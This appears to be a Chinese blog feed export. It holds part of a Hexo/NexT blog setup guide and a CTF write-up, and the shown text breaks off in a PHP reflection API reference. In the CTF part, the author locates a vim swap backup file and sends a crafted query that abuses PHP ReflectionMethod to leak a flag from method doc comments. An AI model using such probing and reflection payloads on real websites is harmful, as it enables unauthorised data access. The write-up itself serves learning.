<h3 id="本地图片引用"><a href="#本地图片引用" class="headerlink" title="本地图片引用"></a>本地图片引用</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install https://github.com/7ym0n/hexo-asset-image --save</span><br></pre></td></tr></table></figure>
<p>安装成功后，需要在根路径的_config.yml如下配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>然后清除hexo缓存</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure>
<p>这样新建的文章会同时自动生成同文章名的文件夹</p>
<p>平时我使用<code>vs code</code>写<code>markdown</code>文档，配合<code>Paste Image</code>插件，只需<code>Ctrl + Alt + V</code>可自动把剪切板的图片复制到同路径的<code>images</code>文件夹下，并在文章中生成图片链接。因hexo只能读取文章同路径下同文章名的文件夹下的文件，需要把<code>images</code>文件夹的所有图片复制到同文章名的文件夹下，然后在文章中把所有<code>images/</code>替换成空即可</p>
<p><strong>示例：</strong></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">MacGesture2-Publish</span></span><br><span class="line"><span class="string">├──</span> <span class="string">apppicker.jpg</span></span><br><span class="line"><span class="string">├──</span> <span class="string">logo.jpg</span></span><br><span class="line"><span class="string">└──</span> <span class="string">rules.jpg</span></span><br><span class="line"><span class="string">MacGesture2-Publish.md</span></span><br></pre></td></tr></table></figure>
<p>使用<code>![logo](logo.jpg)</code>来引入<code>logo.jpg</code></p>
<h3 id="自动部署到github"><a href="#自动部署到github" class="headerlink" title="自动部署到github"></a>自动部署到github</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
<p>然后需要在根路径的_config.yml配置你的git URL</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">https://github.com/xxx/xxx.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure>
<p>然后使用hexo d命令可部署到github</p>
<h3 id="添加流程图支持"><a href="#添加流程图支持" class="headerlink" title="添加流程图支持"></a>添加流程图支持</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-filter-flowchart</span><br></pre></td></tr></table></figure>
<p>安装成功后，需要在根路径的_config.yml文件添加下列代码</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">flowchart:</span></span><br><span class="line">  <span class="comment"># raphael:   # optional, the source url of raphael.js</span></span><br><span class="line">  <span class="comment"># flowchart: # optional, the source url of flowchart.js</span></span><br><span class="line">  <span class="attr">options:</span> <span class="comment"># options used for `drawSVG`</span></span><br></pre></td></tr></table></figure>
<h3 id="设置阅读全文按钮"><a href="#设置阅读全文按钮" class="headerlink" title="设置阅读全文按钮"></a>设置阅读全文按钮</h3><p>只需在文章中添加<code>&lt;!-- more --&gt;</code>标签就行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这是摘要</span><br><span class="line"></span><br><span class="line">&lt;!-- more --&gt;</span><br><span class="line"></span><br><span class="line">这是全文</span><br></pre></td></tr></table></figure>
<h3 id="草稿功能"><a href="#草稿功能" class="headerlink" title="草稿功能"></a>草稿功能</h3><p>新建草稿</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo new draft &lt;title&gt;</span></span><br></pre></td></tr></table></figure>
<p>本机预览草稿</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo S --draft</span></span><br></pre></td></tr></table></figure>
<p>将草稿发布为正式文章</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo P &lt;filename&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="配置评论功能"><a href="#配置评论功能" class="headerlink" title="配置评论功能"></a>配置评论功能</h3><p>最开始是想使用gitalk，但发现<code>gitalk</code>权限过高，并且会泄露<code>client_id</code>和<code>client_secret</code>，所以放弃了，改为使用<code>LiveRe</code>，只需注册后拿到<code>uid</code>再复制到<code>next</code>主题目录下的<code>_config.yml</code>，<code>livere_uid:</code>后填入即可</p>
<h3 id="图片点击预览放大功能"><a href="#图片点击预览放大功能" class="headerlink" title="图片点击预览放大功能"></a>图片点击预览放大功能</h3><p>进入主题目录，下载<code>fancybox</code>包：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> blog\themes\next</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/theme-next-fancybox3 <span class="built_in">source</span>/lib/fancybox</span><br></pre></td></tr></table></figure>
<p>在主题配置文件中启用<code>fancybox</code>：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">fancybox:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>参考：<a href="https://github.com/theme-next/theme-next-fancybox3">https://github.com/theme-next/theme-next-fancybox3</a></p>
<h3 id="添加一个二次元人物"><a href="#添加一个二次元人物" class="headerlink" title="添加一个二次元人物"></a>添加一个二次元人物</h3><p>效果如下：<br><img data-src="/2019/07/08/hexo-blog/2020-08-21-18-23-16.png"><br>首先安装live2d插件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br></pre></td></tr></table></figure>
<p>在Hexo的<code>_config.yml</code>文件中添加下面代码：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">live2d:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">scriptFrom:</span> <span class="string">local</span></span><br><span class="line">  <span class="attr">pluginRootPath:</span> <span class="string">live2dw/</span></span><br><span class="line">  <span class="attr">pluginJsPath:</span> <span class="string">lib/</span></span><br><span class="line">  <span class="attr">pluginModelPath:</span> <span class="string">assets/</span></span><br><span class="line">  <span class="attr">tagMode:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">debug:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">model:</span></span><br><span class="line">    <span class="attr">use:</span> <span class="string">live2d-widget-model-wanko</span></span><br><span class="line">  <span class="attr">display:</span></span><br><span class="line">    <span class="attr">position:</span> <span class="string">right</span></span><br><span class="line">    <span class="attr">width:</span> <span class="number">150</span></span><br><span class="line">    <span class="attr">height:</span> <span class="number">300</span></span><br><span class="line">  <span class="attr">mobile:</span></span><br><span class="line">    <span class="attr">show:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">react:</span></span><br><span class="line">    <span class="attr">opacity:</span> <span class="number">0.7</span></span><br></pre></td></tr></table></figure>
<p>选择一个喜欢的模型，从这个url选择：<a href="https://huaji8.top/post/live2d-plugin-2.0/">https://huaji8.top/post/live2d-plugin-2.0/</a></p>
<p>选好模型后根据以下包名安装相应的npm模块：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">live2d-widget-model-chitose</span><br><span class="line">live2d-widget-model-epsilon2_1</span><br><span class="line">live2d-widget-model-gf</span><br><span class="line">live2d-widget-model-haru&#x2F;01 (use npm install --save live2d-widget-model-haru)</span><br><span class="line">live2d-widget-model-haru&#x2F;02 (use npm install --save live2d-widget-model-haru)</span><br><span class="line">live2d-widget-model-haruto</span><br><span class="line">live2d-widget-model-hibiki</span><br><span class="line">live2d-widget-model-hijiki</span><br><span class="line">live2d-widget-model-izumi</span><br><span class="line">live2d-widget-model-koharu</span><br><span class="line">live2d-widget-model-miku</span><br><span class="line">live2d-widget-model-ni-j</span><br><span class="line">live2d-widget-model-nico</span><br><span class="line">live2d-widget-model-nietzsche</span><br><span class="line">live2d-widget-model-nipsilon</span><br><span class="line">live2d-widget-model-nito</span><br><span class="line">live2d-widget-model-shizuku</span><br><span class="line">live2d-widget-model-tororo</span><br><span class="line">live2d-widget-model-tsumiki</span><br><span class="line">live2d-widget-model-unitychan</span><br><span class="line">live2d-widget-model-wanko</span><br><span class="line">live2d-widget-model-z16</span><br></pre></td></tr></table></figure>
<p>如<code>hijiki</code>对应的是<code>live2d-widget-model-hijiki</code>，然后通过<code>npm install 模型的包名</code>来安装，安装后在<code>_config.yml</code>修改对应的包名来启用：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">model:</span></span><br><span class="line"> <span class="attr">use:</span> <span class="string">live2d-widget-model-hijiki</span></span><br></pre></td></tr></table></figure>

<h3 id="添加背景动画"><a href="#添加背景动画" class="headerlink" title="添加背景动画"></a>添加背景动画</h3><p>安装动画js依赖：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> blog\themes\next</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/theme-next-three <span class="built_in">source</span>/lib/three</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/theme-next-canvas-ribbon <span class="built_in">source</span>/lib/canvas-ribbon</span><br></pre></td></tr></table></figure>
<p>在<strong>NexT</strong>主题的<code>_config.yml</code>文件启用以下配置：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">three_waves:</span> <span class="literal">true</span></span><br><span class="line"><span class="string">OR</span></span><br><span class="line"><span class="attr">canvas_lines:</span> <span class="literal">true</span></span><br><span class="line"><span class="string">OR</span></span><br><span class="line"><span class="attr">canvas_sphere:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>以上三种动画只能选一个：</p>
<ul>
<li>three 的动画是线和点的组合，随鼠标位置的移动而变化。</li>
<li>canvas_nest 是自由移动的线条，当你的鼠标移动时，线条汇聚在你的鼠标位置上，形成多边形。</li>
<li>canvas_ribbon 是随鼠标点击而变化颜色的彩带。</li>
</ul>
<p>启用彩虹背景：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">canvas_ribbon:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>参考：<br><a href="https://github.com/theme-next/theme-next-three">https://github.com/theme-next/theme-next-three</a><br><a href="https://github.com/theme-next/theme-next-canvas-ribbon">https://github.com/theme-next/theme-next-canvas-ribbon</a></p>
<h3 id="启用顶部的阅读进度条"><a href="#启用顶部的阅读进度条" class="headerlink" title="启用顶部的阅读进度条"></a>启用顶部的阅读进度条</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">reading_progress:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h3 id="启用页面加载动画"><a href="#启用页面加载动画" class="headerlink" title="启用页面加载动画"></a>启用页面加载动画</h3><p>页面加载动画指的是刚访问页面，各元素还没有加载完成时，显示的加载进度动画。NexT 提供了多种样式，读者可以自己尝试。<br>安装依赖：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> blog\themes\next</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/theme-next-pace <span class="built_in">source</span>/lib/pace</span><br></pre></td></tr></table></figure>
<p>启用配置：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">pace:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>


<h3 id="不算子计算不显示的BUG"><a href="#不算子计算不显示的BUG" class="headerlink" title="不算子计算不显示的BUG"></a>不算子计算不显示的BUG</h3><p>不算子与hexo-helper-live2d有冲突，经常不显示访问计算，可通过下面的方法修复。</p>
<p>在js目录下创建<code>busuanzi.pure.mini.js</code>文件，内容如下：<br><img data-src="/2019/07/08/hexo-blog/2023-05-23-10-17-54.png"></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> bszCaller, bszTag; !<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">var</span> c, d, e, a = !<span class="number">1</span>, b = []; ready = <span class="function"><span class="keyword">function</span> (<span class="params">c</span>) </span>&#123; <span class="keyword">return</span> a || <span class="string">&quot;interactive&quot;</span> === <span class="built_in">document</span>.readyState || <span class="string">&quot;complete&quot;</span> === <span class="built_in">document</span>.readyState ? c.call(<span class="built_in">document</span>) : b.push(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">return</span> c.call(<span class="built_in">this</span>) &#125;), <span class="built_in">this</span> &#125;, d = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">for</span> (<span class="keyword">var</span> a = <span class="number">0</span>, c = b.length; c &gt; a; a++)b[a].apply(<span class="built_in">document</span>); b = [] &#125;, e = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; a || (a = !<span class="number">0</span>, d.call(<span class="built_in">window</span>), <span class="built_in">document</span>.removeEventListener ? <span class="built_in">document</span>.removeEventListener(<span class="string">&quot;DOMContentLoaded&quot;</span>, e, !<span class="number">1</span>) : <span class="built_in">document</span>.attachEvent &amp;&amp; (<span class="built_in">document</span>.detachEvent(<span class="string">&quot;onreadystatechange&quot;</span>, e), <span class="built_in">window</span> == <span class="built_in">window</span>.top &amp;&amp; (<span class="built_in">clearInterval</span>(c), c = <span class="literal">null</span>))) &#125;, <span class="built_in">document</span>.addEventListener ? <span class="built_in">document</span>.addEventListener(<span class="string">&quot;DOMContentLoaded&quot;</span>, e, !<span class="number">1</span>) : <span class="built_in">document</span>.attachEvent &amp;&amp; (<span class="built_in">document</span>.attachEvent(<span class="string">&quot;onreadystatechange&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; /loaded|complete/.test(<span class="built_in">document</span>.readyState) &amp;&amp; e() &#125;), <span class="built_in">window</span> == <span class="built_in">window</span>.top &amp;&amp; (c = <span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">try</span> &#123; a || <span class="built_in">document</span>.documentElement.doScroll(<span class="string">&quot;left&quot;</span>) &#125; <span class="keyword">catch</span> (b) &#123; <span class="keyword">return</span> &#125; e() &#125;, <span class="number">5</span>))) &#125;(), bszCaller = &#123; <span class="attr">fetch</span>: <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123; <span class="keyword">var</span> c = <span class="string">&quot;BusuanziCallback_&quot;</span> + <span class="built_in">Math</span>.floor(<span class="number">1099511627776</span> * <span class="built_in">Math</span>.random()); <span class="built_in">window</span>[c] = <span class="built_in">this</span>.evalCall(b), a = a.replace(<span class="string">&quot;=BusuanziCallback&quot;</span>, <span class="string">&quot;=&quot;</span> + c), scriptTag = <span class="built_in">document</span>.createElement(<span class="string">&quot;SCRIPT&quot;</span>), scriptTag.type = <span class="string">&quot;text/javascript&quot;</span>, scriptTag.defer = !<span class="number">0</span>, scriptTag.src = a, scriptTag.referrerPolicy = <span class="string">&quot;no-referrer-when-downgrade&quot;</span>, <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;HEAD&quot;</span>)[<span class="number">0</span>].appendChild(scriptTag) &#125;, <span class="attr">evalCall</span>: <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123; <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">b</span>) </span>&#123; ready(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">try</span> &#123; a(b), s = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;[src*=BusuanziCallback]&#x27;</span>), s.parentElement.removeChild(s) &#125; <span class="keyword">catch</span> (c) &#123; <span class="built_in">console</span>.error(c), bszTag.hides() &#125; &#125;) &#125; &#125; &#125;, bszCaller.fetch(<span class="string">&quot;//busuanzi.ibruce.info/busuanzi?jsonpCallback=BusuanziCallback&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123; bszTag.texts(a), bszTag.shows() &#125;), bszTag = &#123; <span class="attr">bszs</span>: [<span class="string">&quot;site_pv&quot;</span>, <span class="string">&quot;page_pv&quot;</span>, <span class="string">&quot;site_uv&quot;</span>], <span class="attr">texts</span>: <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123; <span class="built_in">this</span>.bszs.map(<span class="function"><span class="keyword">function</span> (<span class="params">b</span>) </span>&#123; <span class="keyword">var</span> c = <span class="built_in">document</span>.getElementById(<span class="string">&quot;busuanzi_value_&quot;</span> + b); c &amp;&amp; (c.innerHTML = a[b]) &#125;) &#125;, <span class="attr">hides</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="built_in">this</span>.bszs.map(<span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123; <span class="keyword">var</span> b = <span class="built_in">document</span>.getElementById(<span class="string">&quot;busuanzi_container_&quot;</span> + a); b &amp;&amp; (b.style.display = <span class="string">&quot;none&quot;</span>) &#125;) &#125;, <span class="attr">shows</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="built_in">this</span>.bszs.map(<span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123; <span class="keyword">var</span> b = <span class="built_in">document</span>.getElementById(<span class="string">&quot;busuanzi_container_&quot;</span> + a); b &amp;&amp; (b.style.display = <span class="string">&quot;inline&quot;</span>) &#125;) &#125; &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>全局搜索<code>busuanzi</code>，找到类似下面代码进行修改。<br>修改前：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">async</span> <span class="attr">src</span>=<span class="string">&quot;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>修改后：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">async</span> <span class="attr">src</span>=<span class="string">&quot;/js/busuanzi.pure.mini.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img data-src="/2019/07/08/hexo-blog/2023-05-23-10-19-31.png"></p>
<p>参考：<br><a href="https://ouuan.moe/post/2022/08/busuanzi-and-live2">https://ouuan.moe/post/2022/08/busuanzi-and-live2</a></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/theme-next/theme-next-pace">https://github.com/theme-next/theme-next-pace</a><br><a href="https://tding.top/archives/dfac1e9c.html">https://tding.top/archives/dfac1e9c.html</a></p>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>其它</tag>
      </tags>
  </entry>
  <entry>
    <title>fslh-writeup</title>
    <url>/2020/10/28/fslh-writeup/</url>
    <content><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>在某次比赛中碰到一题很魔幻的题目，让我印象深刻，特别是赛后主办方提供的wp（见下图）看得我久久不能忘怀，机缘巧合之下，又碰到了这一题目，故来分析一下。</p>
<p><img data-src="/2020/10/28/fslh-writeup/image-20201108120312799.png" alt="主办方的wp"></p>
<a id="more"></a>

<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>题目打开只有一个500报错</p>
<p><img data-src="/2020/10/28/fslh-writeup/image-20201108110716269.png" alt="index页面"></p>
<p><img data-src="/2020/10/28/fslh-writeup/image-20201108110825271.png" alt="500报错"></p>
<p>扫描源代码文件，发现<code>index.php.swo</code>备份文件（坑！少见的备份文件格式，其是vim打开文件后的缓存文件），以下为文件内容：</p>
<p><img data-src="/2020/10/28/fslh-writeup/image-20201108110954007.png" alt="index.php.swo"></p>
<p><img data-src="/2020/10/28/fslh-writeup/image-20201108111020441.png" alt="index.php.swo"></p>
<p>分析题目，猜测flag是藏在类的注释中，我们能够实例化任意类，并调用类方法，那么就可以利用PHP 内置类中的 <code>ReflectionMethod</code>来读取<code>User</code>类里面各个函数的注释，本地测试如下：</p>
<p><img data-src="/2020/10/28/fslh-writeup/image-20201108115520912.png" alt="本地测试ReflectionMethod"></p>
<p>构造成题目中的http参数则是：<code>?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment</code></p>
<p>因为不知道是在哪个函数的注释中，所以逐个函数暴破，暴破<code>rb</code>的值<code>a-z</code>，可以发现<code>flag</code>在<code>q</code>的注释中</p>
<p><img data-src="/2020/10/28/fslh-writeup/image-20201108113842585.png" alt="遍历函数注释内容"></p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本题考察的是<code>PHP反射</code>，<code>ReflectionMethod</code>构造<code>User</code>类中的函数方法，再通过<code>getDocComment</code>获取函数的注释，本例中使用<code>__toString</code>同样可以输出函数注释内容。</p>
<h3 id="附"><a href="#附" class="headerlink" title="附"></a>附</h3><h4 id="ReflectionClass-API"><a href="#ReflectionClass-API" class="headerlink" title="ReflectionClass API"></a>ReflectionClass API</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ref</span> = <span class="keyword">new</span> ReflectionClass(B::class);</span><br><span class="line"></span><br><span class="line"><span class="comment">//print_r(ReflectionClass::export(demo::class));</span></span><br><span class="line">print_r(<span class="variable">$ref</span>-&gt;getProperties()); <span class="comment">// 获取一级属性, 可以传参数过滤, 返回ReflectionProperty 对象的数组。</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;getConstructor()); <span class="comment">// 获取构造函数, 未定义返回null</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;inNamespace()); <span class="comment">// 是否在命名空间中</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;getConstants()); <span class="comment">// 获取所有定义的常量</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;getConstant(<span class="string">&#x27;TEST_1&#x27;</span>)); <span class="comment">// 获取某个常量</span></span><br><span class="line">print_r(<span class="variable">$ref</span>-&gt;getDefaultProperties()); <span class="comment">// 获取默认属性, 返回数组, 包括父类的属性</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;getDocComment()); <span class="comment">// 获取类文档注释, 不包含属性和方法的注释, 无注释返回false</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;getExtension()); <span class="comment">// 获取获取最后一行的行数</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;getFileName()); <span class="comment">// 获取定义类的文件名, 返回绝对路径</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;getInterfaceNames()); <span class="comment">// 获取接口名称, 返回索引数组,值为接口名称, 未实现接口返回空数组</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;getInterfaces()); <span class="comment">// 获取接口, 返回关联数组, name=&gt;ReflectionClass实例, 未实现接口返回空数组</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;getMethods()); <span class="comment">// 指获取类方法 ReflectionMethod。</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;getMethod(<span class="string">&#x27;foo4&#x27;</span>)); <span class="comment">// 获取一个类方法的 ReflectionMethod。如果方法不存在会抛出异常, 需要配合try catch一起用</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;getName()); <span class="comment">// 获取类名, 包含命名空间</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;getNamespaceName()); <span class="comment">// 获取命名空间的名称, 没有返回空</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;getParentClass()); <span class="comment">// 获取父类reflectionClass的实例, 没有父类返回false</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;getProperty(<span class="string">&#x27;prop3&#x27;</span>)); <span class="comment">// 获取一个属性, 返回ReflectionProperty实例, 属性不存在会抛出异常, 需配合try catch使用</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;getShortName()); <span class="comment">// 获取类名, 不包含命名空间</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;getStartLine()); <span class="comment">// 获取起始行号</span></span><br><span class="line">print_r(<span class="variable">$ref</span>-&gt;getStaticProperties()); <span class="comment">// 获取静态属性</span></span><br><span class="line">print_r(<span class="variable">$ref</span>-&gt;getStaticPropertyValue(<span class="string">&#x27;prop_static&#x27;</span>)); <span class="comment">// 获取静态属性值, 未定义的属性会报致命错误</span></span><br><span class="line">print_r(<span class="variable">$ref</span>-&gt;getTraitAliases()); <span class="comment">// 返回 trait 别名的一个数组</span></span><br><span class="line">print_r(<span class="variable">$ref</span>-&gt;getTraitNames()); <span class="comment">// 返回 trait 别名的一个数组</span></span><br><span class="line">print_r(<span class="variable">$ref</span>-&gt;getTraits()); <span class="comment">// 返回这个类所使用的 traits 数组</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;hasConstant(<span class="string">&#x27;AB&#x27;</span>)); <span class="comment">// 检查常量是否已经定义</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;hasMethod(<span class="string">&#x27;AB&#x27;</span>)); <span class="comment">// 检查方法是否已经定义</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;hasProperty(<span class="string">&#x27;AB&#x27;</span>)); <span class="comment">// 检查属性是否已定义</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;implementsInterface(<span class="string">&#x27;reflection\Abc&#x27;</span>)); <span class="comment">// 检查是否实现了某个接口, 注意需要带上命名空间</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;isAbstract()); <span class="comment">// 检查类是否是抽象类（abstract）</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;isAnonymous()); <span class="comment">// 检查类是否是匿名类</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;isCloneable()); <span class="comment">// 返回了一个类是否可复制</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;isFinal()); <span class="comment">// 检查类是否声明为 final</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;isInstance(<span class="variable">$obj</span>)); <span class="comment">// 检查一个变量是否此类的实例</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;isInstantiable()); <span class="comment">// 检查类是否可实例化</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;isInterface()); <span class="comment">// 检查类是否是一个接口（interface）</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;isInternal()); <span class="comment">// 检查类是否由扩展或核心在内部定义, 和isUserDefined相对</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;isIterateable()); <span class="comment">// 检查此类是否可迭代, 实现了Iterator接口即可迭代</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;isSubclassOf(A::class)); <span class="comment">// 是否是某一个类的子类</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;isTrait()); <span class="comment">// 返回了是否为一个 trait</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;isUserDefined()); <span class="comment">// 检查是否由用户定义的类 和isInternal相对</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从指定的参数创建一个新的类实例,创建类的新的实例。给出的参数将会传递到类的构造函数。</span></span><br><span class="line"><span class="comment">// 接受可变数目的参数，用于传递到类的构造函数，和 call_user_func() 很相似。</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;newInstance());</span><br><span class="line"><span class="comment">// 从指定的参数创建一个新的类实例,创建类的新的实例。给出的参数将会传递到类的构造函数。</span></span><br><span class="line"><span class="comment">//这个参数以 array 形式传递到类的构造函数。</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;newInstanceArgs([]));</span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;newInstanceWithoutConstructor()); <span class="comment">// 创建一个新的实例而不调用他的构造函数</span></span><br><span class="line"><span class="variable">$ref</span>-&gt;setStaticPropertyValue (<span class="string">&#x27;prop_static&#x27;</span>, <span class="string">&#x27;222&#x27;</span>); <span class="comment">// 设置静态属性的值, 无返回值</span></span><br><span class="line">var_dump(<span class="variable">$ref</span>-&gt;__toString ()); <span class="comment">// 返回 ReflectionClass 对象字符串的表示形式。</span></span><br><span class="line">​```</span><br></pre></td></tr></table></figure>

<h4 id="ReflectionMethod-API"><a href="#ReflectionMethod-API" class="headerlink" title="ReflectionMethod API"></a>ReflectionMethod API</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ReflectionMethod::__construct — ReflectionMethod 的构造函数</span></span><br><span class="line"><span class="comment">ReflectionMethod::export — 输出一个回调方法</span></span><br><span class="line"><span class="comment">ReflectionMethod::getClosure — 返回一个动态建立的方法调用接口，译者注：可以使用这个返回值直接调用非公开方法。</span></span><br><span class="line"><span class="comment">ReflectionMethod::getDeclaringClass — 获取被反射的方法所在类的反射实例</span></span><br><span class="line"><span class="comment">ReflectionMethod::getModifiers — 获取方法的修饰符</span></span><br><span class="line"><span class="comment">ReflectionMethod::getPrototype — 返回方法原型 (如果存在)</span></span><br><span class="line"><span class="comment">ReflectionMethod::invoke — Invoke</span></span><br><span class="line"><span class="comment">ReflectionMethod::invokeArgs — 带参数执行</span></span><br><span class="line"><span class="comment">ReflectionMethod::isAbstract — 判断方法是否是抽象方法</span></span><br><span class="line"><span class="comment">ReflectionMethod::isConstructor — 判断方法是否是构造方法</span></span><br><span class="line"><span 